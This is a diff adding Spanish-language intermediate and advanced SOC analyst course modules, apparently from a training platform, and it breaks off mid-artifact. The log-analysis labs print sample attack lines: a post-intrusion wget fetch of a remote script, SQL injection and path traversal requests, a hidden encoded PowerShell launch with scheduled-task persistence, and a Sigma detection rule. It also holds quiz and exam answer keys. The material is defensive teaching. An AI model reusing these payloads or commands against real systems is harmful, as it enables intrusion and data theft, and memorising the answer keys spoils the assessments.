@@ -4234,6 +4234,529 @@ Reporte del investigador: 2026-08-01 · inyección SQL en el módulo de citas ·
         ]
       },
     ]
+  },
+  cybersecurity_intermedio: {
+    title: "Analista de Ciberseguridad · Nivel Intermedio",
+    description: "El trabajo diario de un analista de SOC: leer registros, detectar fuerza bruta y ataques web, gestionar vulnerabilidades con CVSS, endurecer sistemas y revisar la exposición de red. Laboratorios prácticos y examen con nota mínima del 70%.",
+    lastUpdated: "Octubre 2026",
+    modules: [
+      {
+        id: 'aci_intro',
+        title: "1. 🗺️ Bienvenida al Nivel Intermedio",
+        content: [
+          { type: 'text', icon: 'ShieldCheckIcon', text: "En el Nivel Básico conoció los conceptos, las amenazas y el hacking ético. Ahora se sienta en la consola de un Centro de Operaciones de Seguridad (SOC): analizará registros reales (ficticios), decidirá qué es un ataque y qué es ruido, y priorizará qué corregir primero." },
+          { type: 'text', icon: 'AlarmIcon', text: "Este nivel incluye laboratorios de decisión, retos tipo CTF y un examen que se aprueba con 70%. Todos los sistemas, direcciones y datos son ficticios." },
+          {
+            type: 'interactive',
+            title: 'Vocabulario del SOC',
+            items: [
+              { term: 'SOC', definition: 'Centro de Operaciones de Seguridad: el equipo que vigila, detecta y responde a los eventos de seguridad de una organización.' },
+              { term: 'SIEM', definition: 'Plataforma que centraliza y correlaciona los registros de muchas fuentes para generar alertas.' },
+              { term: 'Alerta / falso positivo', definition: 'Una alerta es una posible amenaza; un falso positivo es una alerta que resulta ser actividad legítima.' },
+              { term: 'Superficie de ataque', definition: 'Todo lo que un atacante podría intentar usar: servicios expuestos, cuentas, aplicaciones, proveedores.' },
+              { term: 'Endurecimiento (hardening)', definition: 'Reducir la superficie de ataque: desactivar lo innecesario, aplicar configuraciones seguras y actualizar.' },
+            ]
+          },
+        ]
+      },
+      {
+        id: 'aci_bruteforce',
+        title: "2. 🚩 Laboratorio: ¿Fuerza Bruta o Rociado de Contraseñas?",
+        content: [
+          { type: 'text', icon: 'LockIcon', text: "En la fuerza bruta (MITRE ATT&CK T1110) se prueban muchas contraseñas contra una cuenta. En el rociado de contraseñas (T1110.003) se prueba una o pocas contraseñas comunes contra muchas cuentas, para no activar el bloqueo por intentos fallidos. Distinguirlos cambia la respuesta." },
+          {
+            type: 'challenge',
+            title: 'El servidor SSH bajo ataque',
+            brief: "Estos son extractos ficticios de /var/log/auth.log de un servidor Linux expuesto a internet. Analícelos.",
+            artifacts: [
+              {
+                name: 'auth.log',
+                content: `Oct 24 03:10:01 srv-web sshd[2210]: Failed password for root from 203.0.113.50 port 51122 ssh2
+Oct 24 03:10:02 srv-web sshd[2212]: Failed password for root from 203.0.113.50 port 51124 ssh2
+Oct 24 03:10:03 srv-web sshd[2214]: Failed password for root from 203.0.113.50 port 51126 ssh2
+... (412 intentos más contra root desde 203.0.113.50 entre 03:10 y 03:24)
+Oct 24 05:02:11 srv-web sshd[3301]: Failed password for invalid user ana from 198.51.100.9 port 40012 ssh2
+Oct 24 05:02:12 srv-web sshd[3303]: Failed password for invalid user carlos from 198.51.100.9 port 40014 ssh2
+Oct 24 05:02:13 srv-web sshd[3305]: Failed password for deploy from 198.51.100.9 port 40016 ssh2
+Oct 24 05:02:14 srv-web sshd[3307]: Failed password for invalid user maria from 198.51.100.9 port 40018 ssh2
+Oct 24 05:02:15 srv-web sshd[3309]: Accepted password for backup from 198.51.100.9 port 40020 ssh2
+Oct 24 05:02:40 srv-web sudo:   backup : TTY=pts/0 ; COMMAND=/usr/bin/wget http://203.0.113.80/x.sh`,
+              },
+            ],
+            questions: [
+              { prompt: '¿Qué IP hizo fuerza bruta contra una sola cuenta?', answers: ['203.0.113.50'], explanation: '203.0.113.50 hizo más de 400 intentos contra root: fuerza bruta clásica. Sin éxito, pero confirma que SSH está expuesto con autenticación por contraseña.' },
+              { prompt: '¿Qué IP hizo rociado de contraseñas contra varias cuentas?', answers: ['198.51.100.9'], explanation: '198.51.100.9 probó un intento por cuenta en varias cuentas: rociado de contraseñas.' },
+              { prompt: '¿Con qué cuenta logró entrar el atacante?', answers: ['backup'], explanation: 'La cuenta backup aceptó la contraseña: probablemente débil o por defecto. Es el hallazgo crítico.' },
+              { prompt: '¿Qué comando ejecutó tras entrar? (nombre del programa)', answers: ['wget', '/usr/bin/wget'], explanation: 'Descargó un script (x.sh) con wget: el inicio de la siguiente fase del ataque. Hay que aislar el servidor y analizar ese script.' },
+            ],
+          },
+          {
+            type: 'quiz',
+            quizData: {
+              question: "¿Qué control habría evitado este compromiso con mayor efectividad?",
+              options: [
+                "Cambiar el puerto de SSH al 2222.",
+                "Desactivar la autenticación por contraseña en SSH y usar llaves o doble factor, además de restringir el acceso por IP o VPN.",
+                "Pedir a los atacantes que se detengan."
+              ],
+              correctOptionIndex: 1,
+              feedback: {
+                correct: "Correcto: sin contraseñas que adivinar, la fuerza bruta y el rociado pierden su efecto. Cambiar el puerto solo reduce el ruido.",
+                incorrect: "Cambiar el puerto es ocultamiento, no protección. El control efectivo es eliminar la autenticación por contraseña y limitar quién puede conectarse."
+              }
+            }
+          },
+        ]
+      },
+      {
+        id: 'aci_web',
+        title: "3. 🚩 Laboratorio: Ataques Web en los Registros",
+        content: [
+          { type: 'text', icon: 'BugIcon', text: "Los registros de un servidor web revelan intentos de ataque: inyección SQL (comillas, OR 1=1, UNION SELECT), recorrido de directorios (../../etc/passwd) o búsqueda de paneles de administración. El código de respuesta indica si el intento tuvo éxito: 200 (respondió), 404 (no existe), 500 (provocó un error)." },
+          {
+            type: 'challenge',
+            title: 'El portal de asociados',
+            brief: "Registro de acceso ficticio del portal web de una cooperativa. Identifique los ataques y si alguno tuvo éxito.",
+            artifacts: [
+              {
+                name: 'access.log',
+                content: `203.0.113.91 - - [24/Oct/2026:10:01:12] "GET /admin HTTP/1.1" 404 210
+203.0.113.91 - - [24/Oct/2026:10:01:13] "GET /wp-login.php HTTP/1.1" 404 210
+203.0.113.91 - - [24/Oct/2026:10:02:40] "GET /descargas?archivo=../../../../etc/passwd HTTP/1.1" 403 199
+203.0.113.91 - - [24/Oct/2026:10:05:02] "GET /asociados?id=105' HTTP/1.1" 500 1893
+203.0.113.91 - - [24/Oct/2026:10:05:30] "GET /asociados?id=105 OR 1=1-- HTTP/1.1" 200 482113
+203.0.113.91 - - [24/Oct/2026:10:06:15] "GET /asociados?id=105 UNION SELECT usuario,clave FROM usuarios-- HTTP/1.1" 200 9120
+198.51.100.30 - - [24/Oct/2026:10:07:00] "GET /asociados?id=212 HTTP/1.1" 200 1450`,
+              },
+            ],
+            questions: [
+              { prompt: '¿Qué parámetro de la aplicación es vulnerable a inyección SQL?', answers: ['id'], explanation: 'El parámetro id de /asociados: la comilla provocó un error 500 y "OR 1=1" devolvió muchísimos datos.' },
+              { prompt: '¿Qué código de respuesta demuestra que "OR 1=1" funcionó? (número)', answers: ['200'], hint: 'Compare también el tamaño de la respuesta con una consulta normal.', explanation: 'Respuesta 200 con 482.113 bytes, frente a ~1.450 de una consulta normal: la aplicación devolvió los datos de todos los asociados.' },
+              { prompt: '¿El intento de recorrido de directorios (../etc/passwd) tuvo éxito? (sí/no)', answers: ['no'], explanation: 'Respondió 403 (prohibido): ese intento fue bloqueado. La inyección SQL, en cambio, sí tuvo éxito.' },
+              { prompt: '¿Qué tabla intentó leer el atacante con UNION SELECT?', answers: ['usuarios'], explanation: 'Intentó extraer usuario y clave de la tabla usuarios, y recibió respuesta 200: posible robo de credenciales. Es un incidente crítico.' },
+            ],
+          },
+        ]
+      },
+      {
+        id: 'aci_vulns',
+        title: "4. Gestión de Vulnerabilidades",
+        content: [
+          { type: 'text', icon: 'AlarmIcon', text: "Nadie puede parchar todo al mismo tiempo: hay que priorizar. El puntaje CVSS mide la severidad técnica (0,1–3,9 baja; 4,0–6,9 media; 7,0–8,9 alta; 9,0–10,0 crítica), pero la prioridad real también depende de si la vulnerabilidad se explota activamente y de qué tan expuesto y crítico es el activo." },
+          { type: 'text', icon: 'ShieldCheckIcon', text: "Fuentes útiles: el catálogo KEV de CISA lista vulnerabilidades explotadas activamente, y el puntaje EPSS (de FIRST) estima la probabilidad de que una vulnerabilidad sea explotada pronto. Combinarlos con el CVSS evita perder tiempo en lo crítico teórico y olvidar lo que se está atacando hoy." },
+          {
+            type: 'scenario',
+            title: 'Caso 1: tres vulnerabilidades, una ventana de mantenimiento',
+            intro: "Solo tiene una ventana de mantenimiento esta semana. Ordene con criterio. Necesita 40 de 60 puntos.",
+            start: 'v1',
+            maxPoints: 60,
+            passPoints: 40,
+            steps: {
+              v1: {
+                text: "¿Cuál parcha primero?",
+                evidence: "A) CVSS 9.8 · servidor interno de pruebas sin datos reales · sin explotación conocida\nB) CVSS 8.1 · VPN expuesta a internet · en el catálogo KEV (explotada activamente)\nC) CVSS 5.3 · intranet · EPSS bajo",
+                choices: [
+                  { text: "B: está expuesta a internet y se explota activamente, aunque su CVSS sea menor que el de A.", next: 'v2', points: 20, feedback: "Correcto: exposición + explotación activa = máxima prioridad real." },
+                  { text: "A: tiene el CVSS más alto.", next: 'v2', points: 0, feedback: "El CVSS mide severidad técnica, no el riesgo real: A está aislada y sin explotación conocida." },
+                ]
+              },
+              v2: {
+                text: "El fabricante de la VPN aún no publica el parche. ¿Qué hace?",
+                choices: [
+                  { text: "Aplico las mitigaciones recomendadas por el fabricante, refuerzo el monitoreo de esa VPN y busco indicios de explotación previa.", next: 'v3', points: 20, feedback: "Bien: mitigar y vigilar mientras llega el parche, y verificar que no hayan entrado ya." },
+                  { text: "Espero el parche sin hacer nada.", next: 'v3', points: -10, feedback: "Una vulnerabilidad explotada activamente no puede esperar sin mitigación." },
+                ]
+              },
+              v3: {
+                text: "¿Cómo deja registro de A y C?",
+                choices: [
+                  { text: "Las registro con su prioridad, responsable y fecha límite según la política, y les hago seguimiento.", next: 'fin', points: 20, feedback: "Correcto: priorizar no es olvidar." },
+                  { text: "Las ignoro porque no son urgentes.", next: 'fin', points: -10, feedback: "Las vulnerabilidades sin seguimiento se acumulan y terminan explotándose." },
+                ]
+              },
+              fin: { text: "Fin del caso. Revise su puntaje y la retroalimentación." },
+            }
+          },
+        ]
+      },
+      {
+        id: 'aci_exposure',
+        title: "5. 🚩 Laboratorio: Exposición de Red",
+        content: [
+          { type: 'text', icon: 'ServerIcon', text: "Un escaneo de la propia red muestra qué está expuesto. Servicios como escritorio remoto (3389), compartición de archivos SMB (445) o bases de datos (3306, MySQL) nunca deberían estar abiertos a internet; los servicios web (443) sí, pero actualizados y protegidos." },
+          {
+            type: 'challenge',
+            title: 'Escaneo autorizado de las IP públicas',
+            brief: "Usted ejecutó, con autorización escrita, un escaneo de las IP públicas de una entidad ficticia. Analice el resultado.",
+            artifacts: [
+              {
+                name: 'escaneo_externo.txt',
+                content: `Host 192.0.2.10 (portal.entidad.example)
+  443/tcp  abierto  https   servidor web actualizado
+  80/tcp   abierto  http    redirige a 443
+Host 192.0.2.20 (srv-contabilidad)
+  3389/tcp abierto  ms-wbt-server (Escritorio remoto)
+  445/tcp  abierto  microsoft-ds (SMB)
+Host 192.0.2.30 (db-asociados)
+  3306/tcp abierto  mysql  versión 5.5 (sin soporte)`,
+              },
+            ],
+            questions: [
+              { prompt: '¿Qué host expone escritorio remoto a internet? (IP)', answers: ['192.0.2.20'], explanation: '192.0.2.20 expone RDP (3389), la puerta de entrada del ransomware en muchos casos reales. Debe cerrarse y accederse solo por VPN con doble factor.' },
+              { prompt: '¿Qué puerto de base de datos está expuesto? (número)', answers: ['3306'], explanation: 'MySQL (3306) abierto a internet y en una versión sin soporte: riesgo crítico para los datos de asociados.' },
+              { prompt: '¿Qué host está configurado correctamente para internet? (IP)', answers: ['192.0.2.10'], explanation: 'El portal solo expone web (443) y redirige el 80 a HTTPS: es lo esperado para un servicio público.' },
+            ],
+          },
+        ]
+      },
+      {
+        id: 'aci_hardening',
+        title: "6. Endurecimiento y Controles Básicos",
+        content: [
+          { type: 'text', icon: 'CheckCircleIcon', text: "Los Controles CIS (versión 8, 18 controles) y las guías de configuración CIS Benchmarks dan una ruta práctica para endurecer sistemas. Los primeros pasos tienen el mayor retorno: inventario de activos y software, configuraciones seguras, gestión de cuentas y accesos, y gestión continua de vulnerabilidades." },
+          {
+            type: 'flashcards',
+            title: 'Controles de alto impacto',
+            cards: [
+              { front: 'Doble factor (MFA)', back: 'En correo, VPN, accesos remotos y cuentas administradoras. Frena la mayoría de los accesos con contraseñas robadas.' },
+              { front: 'Mínimo privilegio', back: 'Cada cuenta con solo los permisos que necesita. Las cuentas de administración, separadas de las de uso diario.' },
+              { front: 'Actualizaciones', back: 'Parches aplicados según prioridad de riesgo, empezando por lo expuesto y lo explotado activamente.' },
+              { front: 'Respaldos 3-2-1', back: '3 copias, en 2 medios distintos, 1 fuera de línea o fuera del sitio. Y pruebas periódicas de restauración.' },
+              { front: 'Registro centralizado', back: 'Enviar los registros a un SIEM o servidor central: si el atacante los borra localmente, la copia sobrevive.' },
+            ]
+          },
+          {
+            type: 'quiz',
+            quizData: {
+              question: "¿Por qué la regla 3-2-1 exige una copia fuera de línea?",
+              options: [
+                "Porque es más barata.",
+                "Porque el ransomware cifra o borra también los respaldos que están conectados a la red.",
+                "Porque así los respaldos son más rápidos."
+              ],
+              correctOptionIndex: 1,
+              feedback: {
+                correct: "Correcto: una copia desconectada es la que permite recuperarse sin pagar.",
+                incorrect: "La razón es el ransomware: busca y destruye los respaldos accesibles desde la red."
+              }
+            }
+          },
+        ]
+      },
+      {
+        id: 'aci_exam',
+        title: "7. 📝 Examen del Nivel Intermedio",
+        content: [
+          { type: 'text', icon: 'CheckCircleIcon', text: "El examen toma 10 preguntas al azar de un banco de 14 y se aprueba con 70%. Al aprobarlo obtendrá el badge de Analista de Ciberseguridad · Nivel Intermedio." },
+          {
+            type: 'exam',
+            title: 'Examen: Analista de Ciberseguridad · Intermedio',
+            description: 'Evalúa análisis de registros, fuerza bruta, ataques web, gestión de vulnerabilidades, exposición de red y endurecimiento.',
+            passPercent: 70,
+            questionsPerAttempt: 10,
+            questions: [
+              { question: '¿Qué hace un SIEM?', options: [{ id: 'k1a', text: 'Centraliza y correlaciona registros de muchas fuentes para generar alertas.', isCorrect: true, score: 10 }, { id: 'k1b', text: 'Cifra los discos.', isCorrect: false, score: 0 }, { id: 'k1c', text: 'Reemplaza al antivirus.', isCorrect: false, score: 0 }], feedback: 'Es la herramienta central de un SOC.' },
+              { question: 'Muchas cuentas distintas reciben un solo intento con la misma contraseña. ¿Qué técnica es?', options: [{ id: 'k2a', text: 'Rociado de contraseñas (password spraying).', isCorrect: true, score: 10 }, { id: 'k2b', text: 'Fuerza bruta sobre una cuenta.', isCorrect: false, score: 0 }, { id: 'k2c', text: 'Inyección SQL.', isCorrect: false, score: 0 }], feedback: 'Evita el bloqueo por intentos fallidos.' },
+              { question: '¿Qué control es más efectivo contra la fuerza bruta en SSH?', options: [{ id: 'k3a', text: 'Desactivar las contraseñas y usar llaves o doble factor, restringiendo el acceso.', isCorrect: true, score: 10 }, { id: 'k3b', text: 'Cambiar el puerto.', isCorrect: false, score: 0 }, { id: 'k3c', text: 'Ponerle un banner de advertencia.', isCorrect: false, score: 0 }], feedback: 'Sin contraseñas que adivinar, el ataque pierde efecto.' },
+              { question: 'En un registro web, "?id=5 OR 1=1--" con respuesta 200 y un tamaño enorme indica…', options: [{ id: 'k4a', text: 'Una inyección SQL exitosa.', isCorrect: true, score: 10 }, { id: 'k4b', text: 'Un usuario normal.', isCorrect: false, score: 0 }, { id: 'k4c', text: 'Un ataque bloqueado.', isCorrect: false, score: 0 }], feedback: 'La aplicación devolvió más datos de los debidos.' },
+              { question: 'Un intento de "../../etc/passwd" recibe respuesta 403. ¿Qué significa?', options: [{ id: 'k5a', text: 'Que fue bloqueado.', isCorrect: true, score: 10 }, { id: 'k5b', text: 'Que tuvo éxito.', isCorrect: false, score: 0 }, { id: 'k5c', text: 'Que el archivo no existe.', isCorrect: false, score: 0 }], feedback: '403 = prohibido.' },
+              { question: '¿Qué rango de CVSS se considera crítico?', options: [{ id: 'k6a', text: '9,0 a 10,0.', isCorrect: true, score: 10 }, { id: 'k6b', text: '4,0 a 6,9.', isCorrect: false, score: 0 }, { id: 'k6c', text: '0,1 a 3,9.', isCorrect: false, score: 0 }], feedback: '7,0–8,9 es alta.' },
+              { question: '¿Qué es el catálogo KEV de CISA?', options: [{ id: 'k7a', text: 'Una lista de vulnerabilidades que se explotan activamente.', isCorrect: true, score: 10 }, { id: 'k7b', text: 'Un antivirus gratuito.', isCorrect: false, score: 0 }, { id: 'k7c', text: 'Una norma de contraseñas.', isCorrect: false, score: 0 }], feedback: 'Ayuda a priorizar lo que se está atacando hoy.' },
+              { question: 'Una vulnerabilidad CVSS 9,8 en un servidor aislado sin explotación conocida, frente a una 8,1 en una VPN expuesta y explotada. ¿Cuál va primero?', options: [{ id: 'k8a', text: 'La de la VPN expuesta y explotada.', isCorrect: true, score: 10 }, { id: 'k8b', text: 'La de 9,8 por tener mayor puntaje.', isCorrect: false, score: 0 }, { id: 'k8c', text: 'Ninguna.', isCorrect: false, score: 0 }], feedback: 'El riesgo real combina severidad, exposición y explotación.' },
+              { question: '¿Qué estima el puntaje EPSS?', options: [{ id: 'k9a', text: 'La probabilidad de que una vulnerabilidad sea explotada pronto.', isCorrect: true, score: 10 }, { id: 'k9b', text: 'El costo de un parche.', isCorrect: false, score: 0 }, { id: 'k9c', text: 'La velocidad de la red.', isCorrect: false, score: 0 }], feedback: 'Lo publica FIRST.' },
+              { question: '¿Qué servicio NO debería estar expuesto a internet?', options: [{ id: 'k10a', text: 'Escritorio remoto (puerto 3389).', isCorrect: true, score: 10 }, { id: 'k10b', text: 'Un portal web en HTTPS (443) actualizado.', isCorrect: false, score: 0 }, { id: 'k10c', text: 'Ninguno: todo debe estar expuesto.', isCorrect: false, score: 0 }], feedback: 'RDP expuesto es una entrada frecuente del ransomware.' },
+              { question: '¿Qué puerto usa por defecto MySQL?', options: [{ id: 'k11a', text: '3306.', isCorrect: true, score: 10 }, { id: 'k11b', text: '443.', isCorrect: false, score: 0 }, { id: 'k11c', text: '22.', isCorrect: false, score: 0 }], feedback: 'Una base de datos nunca debe quedar expuesta a internet.' },
+              { question: '¿Qué dice la regla de respaldos 3-2-1?', options: [{ id: 'k12a', text: '3 copias, 2 medios distintos, 1 fuera de línea o fuera del sitio.', isCorrect: true, score: 10 }, { id: 'k12b', text: '3 servidores, 2 redes, 1 firewall.', isCorrect: false, score: 0 }, { id: 'k12c', text: 'Respaldar cada 3 días a las 2 p. m.', isCorrect: false, score: 0 }], feedback: 'La copia fuera de línea resiste al ransomware.' },
+              { question: '¿Qué significa el principio de mínimo privilegio?', options: [{ id: 'k13a', text: 'Cada cuenta tiene solo los permisos que necesita.', isCorrect: true, score: 10 }, { id: 'k13b', text: 'Todos son administradores para trabajar más rápido.', isCorrect: false, score: 0 }, { id: 'k13c', text: 'Nadie tiene permisos.', isCorrect: false, score: 0 }], feedback: 'Limita el daño de una cuenta comprometida.' },
+              { question: '¿Por qué centralizar los registros en un SIEM o servidor externo?', options: [{ id: 'k14a', text: 'Para que sobrevivan aunque el atacante borre los registros locales.', isCorrect: true, score: 10 }, { id: 'k14b', text: 'Para liberar espacio.', isCorrect: false, score: 0 }, { id: 'k14c', text: 'No sirve.', isCorrect: false, score: 0 }], feedback: 'Y para correlacionar eventos de distintas fuentes.' },
+            ],
+          },
+        ]
+      },
+    ]
+  },
+  cybersecurity_avanzado: {
+    title: "Analista de Ciberseguridad · Nivel Avanzado",
+    description: "Del analista que reacciona al que se anticipa: threat hunting con MITRE ATT&CK, ingeniería de detección con reglas Sigma, seguridad en la nube, Zero Trust, priorización de un informe de pentest y un turno nocturno en el SOC. Examen con nota mínima del 80%.",
+    lastUpdated: "Octubre 2026",
+    modules: [
+      {
+        id: 'aca_intro',
+        title: "1. 🎯 Nivel Avanzado: Anticiparse al Atacante",
+        content: [
+          { type: 'text', icon: 'ShieldCheckIcon', text: "Un analista avanzado no espera a que suene la alarma: formula hipótesis y sale a buscar al atacante (threat hunting), convierte lo que encuentra en reglas de detección, y ayuda a diseñar arquitecturas donde un compromiso no se convierta en desastre." },
+          { type: 'text', icon: 'AlarmIcon', text: "El examen final toma 12 preguntas al azar de un banco de 16 y exige 80%. Al aprobarlo obtendrá el badge de Analista de Ciberseguridad · Nivel Avanzado." },
+        ]
+      },
+      {
+        id: 'aca_hunting',
+        title: "2. 🚩 Laboratorio: Threat Hunting con MITRE ATT&CK",
+        content: [
+          { type: 'text', icon: 'UserSearchIcon', text: "El threat hunting parte de una hipótesis basada en técnicas reales, por ejemplo: \"Si un atacante entró por un documento con macros, veremos procesos de Office lanzando intérpretes de comandos\". Luego se busca en los registros (como los eventos de creación de procesos de Sysmon, ID 1) y se confirma o descarta." },
+          {
+            type: 'challenge',
+            title: 'Hipótesis: un documento de Office lanzó código',
+            brief: "Eventos ficticios de creación de procesos (Sysmon, ID 1) de tres equipos. Confirme o descarte la hipótesis.",
+            artifacts: [
+              {
+                name: 'sysmon_procesos.txt',
+                content: `equipo    hora      proceso_padre                 proceso                          línea de comandos
+PC-031    09:14:02  C:\\...\\explorer.exe            C:\\...\\WINWORD.EXE              "Propuesta_proveedor.docm"
+PC-031    09:14:20  C:\\...\\WINWORD.EXE             C:\\...\\powershell.exe           powershell -nop -w hidden -enc JABjAD0A...
+PC-031    09:14:31  C:\\...\\powershell.exe          C:\\...\\schtasks.exe             schtasks /create /sc onlogon /tn "OneDriveSync" /tr C:\\Users\\Public\\upd.exe
+PC-044    10:02:11  C:\\...\\explorer.exe            C:\\...\\EXCEL.EXE                "Informe_ventas.xlsx"
+PC-052    11:40:03  C:\\...\\services.exe            C:\\...\\svchost.exe              svchost.exe -k netsvcs`,
+              },
+            ],
+            questions: [
+              { prompt: '¿En qué equipo se confirma la hipótesis?', answers: ['PC-031', 'pc031', 'pc-31'], explanation: 'En PC-031, WINWORD.EXE lanzó powershell.exe: un documento .docm (con macros) ejecutó código.' },
+              { prompt: '¿Qué técnica de ATT&CK usa schtasks /create para persistir? (identificador, ej. T1053.005)', answers: ['T1053.005', 't1053.005', 'T1053'], explanation: 'T1053.005 (Tarea programada): crea una tarea que se ejecuta en cada inicio de sesión, con un nombre que imita a OneDrive para pasar desapercibida.' },
+              { prompt: '¿Qué ejecutable se programó para persistir? (ruta o nombre)', answers: ['upd.exe', 'C:\\Users\\Public\\upd.exe', 'c:\\users\\public\\upd.exe'], explanation: 'upd.exe en C:\\Users\\Public: una ubicación escribible por cualquier usuario, típica de malware.' },
+            ],
+          },
+        ]
+      },
+      {
+        id: 'aca_detection',
+        title: "3. 🚩 Ingeniería de Detección con Sigma",
+        content: [
+          { type: 'text', icon: 'DocumentTextIcon', text: "Lo que se descubre en una cacería se convierte en una regla para no tener que buscarlo de nuevo. Sigma es un formato abierto para escribir reglas de detección una sola vez y traducirlas a distintos SIEM. Cada regla define la fuente de registros, las condiciones y su nivel de severidad." },
+          { type: 'text', icon: 'CheckCircleIcon', text: "Una buena regla equilibra cobertura y ruido: si genera cientos de falsos positivos, el equipo terminará ignorándola. Se prueba con datos reales antes de activarla." },
+          {
+            type: 'challenge',
+            title: 'Evalúe la regla antes de activarla',
+            brief: "Esta regla Sigma ficticia busca procesos de Office que lanzan intérpretes de comandos. Revise la regla y los eventos de prueba.",
+            artifacts: [
+              {
+                name: 'regla_office_shell.yml',
+                content: `title: Office lanza un intérprete de comandos
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  padre_office:
+    ParentImage|endswith:
+      - '\\WINWORD.EXE'
+      - '\\EXCEL.EXE'
+      - '\\POWERPNT.EXE'
+  hijo_shell:
+    Image|endswith:
+      - '\\powershell.exe'
+      - '\\cmd.exe'
+      - '\\wscript.exe'
+  condition: padre_office and hijo_shell
+level: high`,
+              },
+              {
+                name: 'eventos_prueba.txt',
+                content: `E1  ParentImage=...\\WINWORD.EXE   Image=...\\powershell.exe
+E2  ParentImage=...\\EXCEL.EXE    Image=...\\splwow64.exe
+E3  ParentImage=...\\explorer.exe Image=...\\powershell.exe
+E4  ParentImage=...\\EXCEL.EXE    Image=...\\cmd.exe`,
+              },
+            ],
+            questions: [
+              { prompt: '¿Qué campo identifica al proceso padre en la regla?', answers: ['ParentImage', 'parentimage'], explanation: 'ParentImage es el proceso padre; Image, el proceso que se crea.' },
+              { prompt: '¿Cuántos de los 4 eventos de prueba activan la regla? (número)', answers: ['2', 'dos'], explanation: 'E1 (Word → PowerShell) y E4 (Excel → cmd). E2 tiene un hijo que no es un intérprete; E3 tiene un padre que no es Office.' },
+              { prompt: '¿Qué nivel de severidad tiene la regla?', answers: ['high', 'alto', 'alta'], explanation: 'level: high. Es razonable: un documento de Office rara vez necesita lanzar un intérprete de comandos.' },
+            ],
+          },
+        ]
+      },
+      {
+        id: 'aca_cloud',
+        title: "4. Seguridad en la Nube",
+        content: [
+          { type: 'text', icon: 'ServerIcon', text: "En la nube rige el modelo de responsabilidad compartida: el proveedor protege la infraestructura, pero la configuración, las identidades, los permisos y los datos son responsabilidad del cliente. La mayoría de los incidentes en la nube vienen de configuraciones erróneas, no de fallas del proveedor." },
+          {
+            type: 'scenario',
+            title: 'Caso 1: el almacenamiento público',
+            intro: "Un investigador avisa a una entidad ficticia que encontró un contenedor de almacenamiento en la nube con documentos de asociados, accesible sin autenticación. Necesita 60 de 80 puntos.",
+            start: 'n1',
+            maxPoints: 80,
+            passPoints: 60,
+            steps: {
+              n1: {
+                text: "¿Qué hace primero?",
+                choices: [
+                  { text: "Bloqueo el acceso público del contenedor de inmediato y preservo sus registros de acceso.", next: 'n2', points: 20, feedback: "Correcto: se corta la exposición y se conserva la evidencia de quién accedió." },
+                  { text: "Borro el contenedor para que nadie lo vea.", next: 'n2', points: -10, feedback: "Borrar destruye la evidencia y quizá datos necesarios para la operación." },
+                ]
+              },
+              n2: {
+                text: "Los registros muestran descargas desde IP desconocidas durante semanas. ¿Qué implica?",
+                choices: [
+                  { text: "Es un incidente de datos personales: hay que evaluar el alcance, activar el procedimiento de respuesta y preparar el reporte a la SIC.", next: 'n3', points: 20, feedback: "Bien: la exposición se convirtió en una posible fuga de datos personales." },
+                  { text: "Como no hubo \"hackeo\", no hay incidente.", next: 'n3', points: -10, feedback: "Una exposición con descargas de terceros es un incidente, aunque nadie haya \"roto\" nada." },
+                ]
+              },
+              n3: {
+                text: "¿Cuál fue la causa raíz más probable?",
+                choices: [
+                  { text: "Una configuración de acceso público hecha para una prueba y nunca revertida, sin revisión periódica de la configuración.", next: 'n4', points: 20, feedback: "Correcto: es el patrón más común en la nube." },
+                  { text: "Una falla del proveedor de nube.", next: 'n4', points: 0, feedback: "En el modelo compartido, la configuración es responsabilidad del cliente." },
+                ]
+              },
+              n4: {
+                text: "¿Qué control propone para que no se repita?",
+                choices: [
+                  { text: "Bloqueo del acceso público por política a nivel de cuenta, revisión continua de configuración (CSPM), mínimo privilegio y alertas de cambios.", next: 'fin', points: 20, feedback: "Excelente: controles preventivos y de detección." },
+                  { text: "Pedir a todos que tengan más cuidado.", next: 'fin', points: 0, feedback: "Sin controles técnicos, el error se repetirá." },
+                ]
+              },
+              fin: { text: "Fin del caso. Revise su puntaje y la retroalimentación." },
+            }
+          },
+        ]
+      },
+      {
+        id: 'aca_zerotrust',
+        title: "5. Arquitectura Zero Trust y Segmentación",
+        content: [
+          { type: 'text', icon: 'LockIcon', text: "Zero Trust (descrita en NIST SP 800-207) parte de \"nunca confiar, siempre verificar\": estar dentro de la red no da acceso por sí mismo. Cada acceso se evalúa según la identidad, el estado del dispositivo y el contexto, con el mínimo privilegio necesario." },
+          { type: 'text', icon: 'ServerIcon', text: "La segmentación limita el movimiento lateral: si un equipo de oficina se compromete, no debería poder llegar directamente a los servidores de la base de datos ni a los respaldos." },
+          {
+            type: 'flashcards',
+            title: 'Principios Zero Trust en la práctica',
+            cards: [
+              { front: 'Verificar explícitamente', back: 'Cada acceso se autentica y autoriza con identidad fuerte (MFA), estado del dispositivo y contexto.' },
+              { front: 'Mínimo privilegio', back: 'Acceso justo a lo necesario y por el tiempo necesario (por ejemplo, permisos de administración temporales).' },
+              { front: 'Asumir el compromiso', back: 'Diseñar como si el atacante ya estuviera dentro: segmentar, cifrar y monitorear para limitar el daño.' },
+              { front: 'Microsegmentación', back: 'Dividir la red en zonas pequeñas con reglas estrictas entre ellas, para frenar el movimiento lateral.' },
+            ]
+          },
+          {
+            type: 'quiz',
+            quizData: {
+              question: "En una red plana, un portátil comprometido llega a los servidores de respaldo. ¿Qué principio habría limitado el daño?",
+              options: [
+                "Confiar en todo lo que está dentro de la red.",
+                "Segmentación y mínimo privilegio, asumiendo que un equipo podía ser comprometido.",
+                "Cambiar el fondo de pantalla corporativo."
+              ],
+              correctOptionIndex: 1,
+              feedback: {
+                correct: "Correcto: con segmentación, el portátil no tendría camino directo a los respaldos.",
+                incorrect: "La confianza implícita en la red interna es justamente lo que Zero Trust elimina."
+              }
+            }
+          },
+        ]
+      },
+      {
+        id: 'aca_pentest',
+        title: "6. 🚩 Priorizar un Informe de Pentest",
+        content: [
+          { type: 'text', icon: 'DocumentTextIcon', text: "Un informe de pruebas de penetración no se lee de arriba hacia abajo: se buscan las cadenas de ataque, es decir, cómo varios hallazgos medios se combinan en un compromiso crítico. Corregir el eslabón que rompe la cadena puede valer más que corregir el hallazgo con mayor puntaje aislado." },
+          {
+            type: 'challenge',
+            title: 'Cinco hallazgos, una cadena',
+            brief: "Resumen ficticio de un pentest autorizado. Identifique la cadena de ataque y qué corregir primero.",
+            artifacts: [
+              {
+                name: 'hallazgos_pentest.txt',
+                content: `H1  Media    Portal de empleados sin límite de intentos de inicio de sesión
